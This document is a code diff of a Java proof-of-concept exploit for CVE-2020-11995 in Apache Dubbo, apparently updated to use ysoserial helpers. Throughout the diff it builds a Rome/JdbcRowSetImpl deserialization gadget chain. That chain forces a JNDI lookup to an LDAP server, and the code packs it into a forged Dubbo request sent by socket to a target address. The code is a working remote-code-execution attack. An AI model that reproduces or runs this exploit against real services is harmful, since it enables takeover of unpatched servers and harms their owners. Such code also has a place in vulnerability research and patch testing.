@@ -3,26 +3,31 @@ package cve;
 import com.rometools.rome.feed.impl.EqualsBean;
 import com.rometools.rome.feed.impl.ToStringBean;
 import com.sun.rowset.JdbcRowSetImpl;
-import marshalsec.util.Reflections;
+
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.Cleanable;
-import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
-import org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation;
+import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
+
+import ysoserial.payloads.util.Gadgets;
+import ysoserial.payloads.util.Reflections;
+
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
-import java.lang.reflect.Array;
-import java.lang.reflect.Constructor;
 import java.net.Socket;
 import java.util.HashMap;
 import java.util.Random;
 
 /**
- * 测试版本：dubbo 2.7.6
+ * 测试版本：dubbo 2.7.7
+ * 修复版本：dubbo 2.7.8
  */
 public class CVE_2020_11995 {
 
+    static String dubbo_ip = "10.58.120.200";
+    static int dubbo_port = 20880;
+    static String ldapUri = "ldap://10.58.120.200:1389/fg4e1a";
 
-    public static void setPayload(Hessian2ObjectOutput hessian2ObjectOutput,String jndiUrl) throws Exception {
+    public static void setPayload(Hessian2ObjectOutput body, String jndiUrl) throws Exception {
 
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(jndiUrl);
@@ -32,30 +37,12 @@ public class CVE_2020_11995 {
         ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
         EqualsBean root = new EqualsBean(ToStringBean.class, item);
 
-        HashMap s = new HashMap<>();
-        Reflections.setFieldValue(s, "size", 2);
-        Class<?> nodeC;
-        try {
-            nodeC = Class.forName("java.util.HashMap$Node");
-        } catch (ClassNotFoundException e) {
-            nodeC = Class.forName("java.util.HashMap$Entry");
-        }
-        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
-        nodeCons.setAccessible(true);
+        HashMap hashMap = Gadgets.makeMap(root, root);
 
-        Object tbl = Array.newInstance(nodeC, 2);
-        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
-        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
-        Reflections.setFieldValue(s, "table", tbl);
-
-        hessian2ObjectOutput.writeObject(s);
+        body.writeObject(hashMap);
     }
 
     public static void main(String[] args) throws Exception{
-
-
-        //dubbo_data
-        ByteArrayOutputStream dubbo_data = new ByteArrayOutputStream();
 
         // header.
         byte[] dubbo_header = new byte[16];
@@ -66,34 +53,33 @@ public class CVE_2020_11995 {
         // set request id.
         Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);
 
-        //dubbo_body
-        ByteArrayOutputStream dubbo_body = new ByteArrayOutputStream();
-        Hessian2ObjectOutput hessian2ObjectOutput = new Hessian2ObjectOutput(dubbo_body);
+        //bodyBaos
+        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
+        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);
 
-        hessian2ObjectOutput.writeUTF("2.7.6");//dubbo版本
-//todo 此处填写注册中心获取到的service全限定名、版本号、方法名
-        hessian2ObjectOutput.writeUTF("com.pacemrc.dubbo.api.DemoService");//接口全限定名
-        hessian2ObjectOutput.writeUTF("");//接口的版本
-        hessian2ObjectOutput.writeUTF("$invokeAsync");//$invoke $invokeAsync $echo  方法名换成三个中任意一个
-//todo 方法描述不需要修改，因为此处需要指定map的payload去触发
-        hessian2ObjectOutput.writeUTF("Ljava/util/Map;");
-//todo 此处填写ldap url
-        setPayload(hessian2ObjectOutput,"ldap://10.58.120.200:1389/pikl90");
-        hessian2ObjectOutput.writeObject(new HashMap());
+        body.writeUTF("2.7.1");
+        body.writeUTF("any_path");
+        body.writeUTF("");
+        body.writeUTF("$invokeAsync");//$invoke $invokeAsync $echo  方法名换成三个中任意一个
+        body.writeUTF("Ljava/util/Map;");
+        setPayload(body,ldapUri);
+        body.writeObject(new HashMap());
 
-        hessian2ObjectOutput.flushBuffer();
-        if (hessian2ObjectOutput instanceof Cleanable) {
-            ((Cleanable) hessian2ObjectOutput).cleanup();
+        body.flushBuffer();
+        if (body instanceof Cleanable) {
+            ((Cleanable) body).cleanup();
         }
 
-        Bytes.int2bytes(dubbo_body.size(), dubbo_header, 12);
-        dubbo_data.write(dubbo_header);
-        dubbo_data.write(dubbo_body.toByteArray());
+        Bytes.int2bytes(bodyBaos.size(), dubbo_header, 12);
+        //totalBaos
+        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
 
-        byte[] bytes = dubbo_data.toByteArray();
+        totalBaos.write(dubbo_header);
+        totalBaos.write(bodyBaos.toByteArray());
 
-//todo 此处填写被攻击的dubbo服务提供者地址和端口
-        Socket socket = new Socket("10.58.120.200", 20880);
+        byte[] bytes = totalBaos.toByteArray();
+
+        Socket socket = new Socket(dubbo_ip, dubbo_port);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
